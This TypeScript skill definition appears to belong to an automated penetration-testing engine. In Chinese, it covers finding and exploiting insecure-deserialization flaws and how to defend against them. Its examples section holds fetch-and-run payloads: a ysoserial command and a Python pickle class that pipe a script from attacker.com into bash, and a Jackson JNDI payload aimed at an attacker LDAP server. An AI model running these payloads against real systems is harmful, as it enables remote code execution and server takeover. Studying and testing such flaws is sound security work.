/**
 * HOS-Sec-Engine V2 - Web Deserialization 0day Skills
 * 反序列化 0day 专项 Skill
 */

import { AttackDefenseSkill, DEFAULT_SKILL_RUNTIME } from '../../../types/skill';

export const deser0daySkills: AttackDefenseSkill[] = [
  {
    metadata: {
      id: 'web-deser-0day',
      name: 'Web Deserialization 0day',
      category: 'web',
      subCategory: 'deserialization',
      riskLevel: 'critical',
      confidence: 0.85,
      updatedAt: '2026-06',
      author: 'HOS-Sec-Engine',
      tags: ['deserialization', '0day', 'rce', 'gadget-chain', 'java', 'php', 'python'],
    },
    trigger: {
      scenarios: [
        '目标使用最新版本的序列化库，存在未公开的 gadget chain',
        '应用通过 Cookie、Session 或 API 请求体接收序列化的对象数据',
        'Java 应用使用 ObjectInputStream.readObject() 反序列化用户可控数据',
        'PHP 应用使用 unserialize() 处理用户输入',
        'Python 应用使用 pickle.loads() 或 yaml.load() 反序列化不可信数据',
        '发现序列化格式但已知 gadget chain 已被厂商补丁修复，需要寻找新的利用链',
      ],
      keywords: [
        '反序列化',
        'deserialization',
        'unserialize',
        'readObject',
        'gadget chain',
        '0day deser',
      ],
      aliases: [
        '反序列化 0day',
        'deser 0day',
        'gadget chain 0day',
      ],
      indicators: [
        'Unexpected class instantiation',
        'Object construction from serialized data',
        'Base64-encoded serialized payload in request',
        'rO0AB (Java serialization magic bytes)',
        'O: in PHP serialized data',
      ],
    },
    knowledge: {
      description:
        '不安全的反序列化是 OWASP Top 10 中的高危漏洞类别，允许攻击者通过构造恶意序列化数据在反序列化过程中触发对象创建、方法调用和代码执行。反序列化 0day 的核心在于发现新的 gadget chain——一系列可以串联调用的类和方法，最终导致远程代码执行 (RCE)。Java 反序列化是最著名的领域，ysoserial 提供了经典的 CommonsCollections 利用链，但随着 JDK 安全加固，旧链逐渐失效，需要挖掘新的 gadget chain。PHP unserialize() 的 POP chain 同样在持续演进。Python 的 pickle 模块本质不安全，任何反序列化操作都应避免处理不可信数据。现代反序列化 0day 通常涉及：框架级 gadget chain（如 Spring Framework、Jackson 的新利用链）、库版本差异导致的绕过（如 Fastjson 的 autoType 绕过）、以及混合攻击向量（反序列化 + JNDI + LDAP/RMI 的组合利用）。',
      symptoms: [
        '应用接收 Base64 编码的序列化对象数据（Java、.NET）并直接反序列化',
        'Cookie 中包含序列化的 PHP 对象（以 "O:" 开头）或 Java 序列化数据（以 "rO0AB" 开头）',
        'JSON 请求体中包含 @type、@class、_type 等类型标识字段，指示服务端进行类型推断反序列化',
        'XML 请求体中包含自定义对象标签（XStream、.NET DataContractSerializer）',
        '应用错误响应暴露了反序列化异常信息（ClassNotFoundException、InvalidClassException）',
        '应用使用了已知存在反序列化风险的库（CommonsCollections、XStream、Kryo、Fastjson）',
      ],
      rootCauses: [
        '服务端直接反序列化用户可控的数据源（HTTP 请求体、Cookie、Session），未做任何类型校验或过滤',
        'Java ObjectInputStream 的 resolveClass() 方法未做白名单过滤，允许任意类被实例化',
        'PHP unserialize() 允许指定任意类名和属性，攻击者可以构造包含恶意 __wakeup()、__destruct() 方法的对象',
        'Python pickle 模块的 __reduce__ 方法允许指定任意构造函数和参数，可直接执行系统命令',
        'Jackson 的 enableDefaultTyping 或 @JsonTypeInfo 注解允许 JSON 中的 @type 字段指定反序列化类',
        'Fastjson 的 autoType 功能在特定版本中存在绕过机制（如 L 前缀、[[ 数组、$ref 引用）',
        '.NET BinaryFormatter 和 SoapFormatter 反序列化用户可控数据，触发任意代码执行',
      ],
      observations: [
        'Java 反序列化 gadget chain 的挖掘通常从 gadget 入口（readObject、readExternal、readResolve）开始，通过方法调用链找到 Runtime.exec() 或 ProcessBuilder',
        'CommonsCollections 1-7 在 JDK 8u71+ 中因 AnnotationInvocationHandler 修复而失效',
        'Spring Framework 的反序列化利用链在多个版本中被披露，Spring 生态系统的复杂性使其持续成为目标',
        'Fastjson 的 autoType 绕过经历了数十个版本的攻防对抗，最新的绕过方式通常涉及嵌套类型引用和类加载器差异',
        'PHP POP chain 的构造依赖于框架自带的魔术方法链，ThinkPHP、Laravel、WordPress 插件中的反序列化漏洞占比很高',
        'Python pickle 反序列化是"设计层面不安全"的，官方文档明确警告不要对不可信数据使用 pickle',
        '混合利用链（如反序列化 → JNDI 注入 → LDAP 服务器 → 加载远程 Class）是近年来 Java 反序列化攻击的主流模式',
      ],
      commonMistakes: [
        '只关注已知的 gadget chain，忽略了目标环境中可能存在的新型利用链',
        '未验证目标应用的实际类路径（classpath），使用的 gadget chain 依赖的库可能不存在于目标环境',
        '忽视了反序列化数据的编码格式（Base64、URL 编码、序列化协议版本）导致的 payload 损坏',
        '未考虑反序列化过程中的异常处理——即使 payload 触发了异常，可能已经完成了部分危险操作',
        '误认为 JSON/XML 反序列化是安全的，实际上 Jackson、XStream 等库的类型推断功能同样危险',
        '未测试反序列化与其他漏洞的组合利用（如反序列化 + SSRF、反序列化 + JNDI 注入）',
        '忽略了序列化数据的长度限制——某些系统对 Cookie 或请求体大小有限制，需要精简 gadget chain',
      ],
      notes: [
        'ysoserial 是 Java 反序列化利用链的权威工具集',
        'Java 反序列化 gadget chain 挖掘工具：gadgetinspector、CodeQL 反序列化查询',
        'PHP 反序列化利用工具：phpggc',
        'Python pickle 反序列化 payload 可使用 pickletools 模块进行分析和构造',
        'Jackson 反序列化需要 enableDefaultTyping 或 @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS) 才危险',
        'YAML 反序列化应始终使用 yaml.safe_load() 而非 yaml.load()',
        '反序列化 0day 的测试应在隔离环境中进行，因为恶意 payload 可能对目标系统造成不可逆破坏',
      ],
    },
    action: {
      checklist: [
        '识别目标使用的序列化格式（Java/PHP/Python/Node.js/.NET）和具体库版本',
        '定位反序列化入口点：HTTP 请求体、Cookie、Session、消息队列、缓存、文件上传',
        '分析目标应用的 classpath/依赖库，确认 gadget chain 所需的类是否存在',
        '使用 ysoserial/phpggc 等工具生成已知 gadget chain 的 payload 进行初步测试',
        '如果已知 chain 被修复，分析补丁差异寻找绕过方式或新型 gadget chain',
        '对于 Jackson/Fastjson 等 JSON 反序列化，测试 @type/@class 字段和 autoType 绕过',
        '混合利用：结合 JNDI 注入、LDAP/RMI 服务器、远程 Class 加载构建完整利用链',
        '使用 CodeQL 或 gadgetinspector 对目标库源码进行静态分析，发现新的 gadget chain',
        '验证 RCE 是否成功：使用 DNS 外带（dnslog.cn）或 HTTP 回调确认命令执行',
      ],
      techniques: [
        'Java readObject gadget chain：利用 ObjectInputStream.readObject() 触发的方法调用链执行 RCE',
        'PHP POP chain：利用 __wakeup()、__destruct()、__toString() 等魔术方法链构造利用',
        'Python pickle __reduce__：构造包含 os.system 调用的 __reduce__ 方法实现 RCE',
        'Jackson @type 反序列化：通过 JSON 中的 @type 字段指定任意类进行反序列化',
        'Fastjson autoType 绕过：利用 L 前缀、[[ 数组嵌套、$ref 引用等绕过 autoType 限制',
        'JNDI 注入组合利用：反序列化触发 JNDI 查找 → LDAP 服务器返回恶意 Reference → 加载远程 Class',
        'XStream XML 反序列化：通过 XML 标签指定任意 Java 类进行反序列化',
        '.NET BinaryFormatter 反序列化：利用 TypeConfuseDelegate 等 gadget chain 实现 RCE',
      ],
      examples: [
        {
          name: 'Java CommonsCollections gadget chain (RCE)',
          description: '利用 Apache CommonsCollections 库中的 Transformer 链，通过反序列化触发 Runtime.exec() 执行系统命令',
          content:
            '原理: CommonsCollections 的 ChainedTransformer 可以串联多个 Transformer 调用\n' +
            '     最终调用 Runtime.getRuntime().exec() 执行系统命令\n' +
            '     InvokerTransformer 通过反射调用任意方法\n\n' +
            '使用 ysoserial 生成 payload:\n' +
            'java -jar ysoserial.jar CommonsCollections5 "curl http://attacker.com/shell.sh | bash" > payload.bin\n\n' +
            '发送 payload:\n' +
            'POST /api/import HTTP/1.1\n' +
            'Content-Type: application/octet-stream\n' +
            'Cookie: session=rO0ABXcEAAAA... (Base64 编码的 payload)\n\n' +
            '注意: CommonsCollections 1-7 在 JDK 8u71+ 中因 AnnotationInvocationHandler 修复而失效\n' +
            '     需要使用更新的 gadget chain（如 CommonsBeanutils、Spring AOP、JNDI 注入）',
          applicableScenarios: ['Java Web 应用', 'Jenkins', 'WebLogic', 'JBoss', 'Spring Boot 应用'],
        },
        {
          name: 'Python pickle 反序列化 RCE',
          description: '利用 Python pickle 模块的 __reduce__ 方法构造恶意序列化数据，反序列化时执行任意命令',
          content:
            'Python pickle 反序列化本质不安全，官方文档明确警告不要对不可信数据使用\n\n' +
            '构造恶意 pickle payload:\n' +
            'import pickle, base64, os\n\n' +
            'class RCE:\n' +
            '    def __reduce__(self):\n' +
            '        return (os.system, ("curl http://attacker.com/shell.sh | bash",))\n\n' +
            'payload = base64.b64encode(pickle.dumps(RCE())).decode()\n' +
            'print(payload)\n\n' +
            '防御: 绝不使用 pickle.loads() 处理不可信数据，使用 json 或 msgpack 替代',
          applicableScenarios: ['Python Web 应用', 'Flask/Django Session', 'Celery 任务队列'],
        },
        {
          name: 'Jackson @type 反序列化 RCE',
          description: '利用 Jackson 的 @type 字段指定反序列化类，通过危险类的方法调用实现 RCE',
          content:
            '前提条件: Jackson 启用了 enableDefaultTyping 或 @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)\n\n' +
            '攻击 payload:\n' +
            '{\n' +
            '  "@type": "com.sun.rowset.JdbcRowSetImpl",\n' +
            '  "dataSourceName": "ldap://attacker.com:1389/Exploit",\n' +
            '  "autoCommit": true\n' +
            '}\n\n' +
            '原理: JdbcRowSetImpl 的 setAutoCommit() 方法会触发 JNDI 查找\n' +
            '     JNDI 查找 attacker.com 的 LDAP 服务器\n' +
            '     LDAP 服务器返回恶意的 Reference 对象\n' +
            '     JNDI 加载远程 Class 并执行静态初始化块中的代码\n\n' +
            '防御: 禁用 Jackson 的 enableDefaultTyping，使用 @JsonTypeInfo(use = JsonTypeInfo.Id.NAME) 配合类型白名单',
          applicableScenarios: ['Spring Boot API', '使用 Jackson 的 Java 应用', 'REST API JSON 处理'],
        },
      ],
    },
    validation: {
      indicators: [
        '目标系统向攻击者控制的 DNS 服务器发起 DNS 查询（DNS 外带确认反序列化触发）',
        '目标系统向攻击者控制的 HTTP 服务器发起请求（HTTP 回调确认 RCE）',
        '反序列化异常信息暴露了目标系统的类路径和库版本',
        '使用已知 gadget chain payload 后，目标系统执行了预期命令',
        'Jackson/Fastjson 的 @type 字段被成功处理，指定类被实例化',
        'PHP unserialize() 后触发了预期的魔术方法调用',
      ],
      successSigns: [
        '成功触发 RCE，在目标系统上执行了任意命令',
        '成功触发 SSRF，目标系统向攻击者控制的地址发起请求',
        '成功读取目标系统敏感文件（如 /etc/passwd、web.config）',
        '反序列化 payload 被目标系统接受并处理（无异常或异常中暴露了敏感信息）',
      ],
      falsePositiveSigns: [
        '反序列化异常但目标类不存在于 classpath 中',
        'payload 被 WAF/IPS 拦截，并非反序列化漏洞不存在',
        'DNS 查询来自 WAF 或安全设备而非目标应用本身',
        'JSON/XML 请求被接受但 @type 字段被忽略（反序列化库未启用类型推断）',
      ],
    },
    defense: {
      recommendations: [
        'Java: 避免使用 ObjectInputStream 反序列化不可信数据，使用 JSON/XML 等安全格式替代',
        'Java: 实施反序列化白名单（ObjectInputFilter / SerialKiller），只允许已知安全的类',
        'PHP: 避免使用 unserialize() 处理用户输入，使用 json_decode() 替代',
        'Python: 绝不使用 pickle.loads() 处理不可信数据，使用 json 或 msgpack 替代',
        'Python: YAML 反序列化始终使用 yaml.safe_load() 而非 yaml.load()',
        'Jackson: 禁用 enableDefaultTyping，使用 @JsonTypeInfo(use = JsonTypeInfo.Id.NAME) 配合类型白名单',
        'Fastjson: 升级到 Fastjson 2.x，或禁用 autoType',
        'XStream: 配置类型白名单 (XStream.denyTypes() / XStream.allowTypes())',
        '.NET: 避免使用 BinaryFormatter，使用 System.Text.Json 或 DataContractJsonSerializer',
      ],
      mitigations: [
        '部署 WAF 规则检测常见反序列化 payload 特征（rO0AB、O:、!!python/object、@type）',
        '监控反序列化异常日志，及时发现可疑的反序列化尝试',
        '使用 CodeQL 或 Semgrep 定期扫描代码库中的不安全反序列化调用',
        '实施网络隔离，限制应用进程可以发起的外部网络连接（防止 JNDI/LDAP 利用）',
      ],
      references: [
        'https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data',
        'https://github.com/frohoff/ysoserial',
        'https://github.com/ambionics/phpggc',
        'https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html',
        'https://portswigger.net/web-security/deserialization',
      ],
    },
    quality: {
      confidence: 0.85,
      reviewed: false,
      tested: false,
      lastVerified: '2026-06',
    },
    playbooks: ['web-pentest-full'],
    phase: 'exploitation',
    runtime: {
      ...DEFAULT_SKILL_RUNTIME,
      requiresNetwork: true,
      estimatedTokens: 3000,
    },
    enabled: true,
  },
];
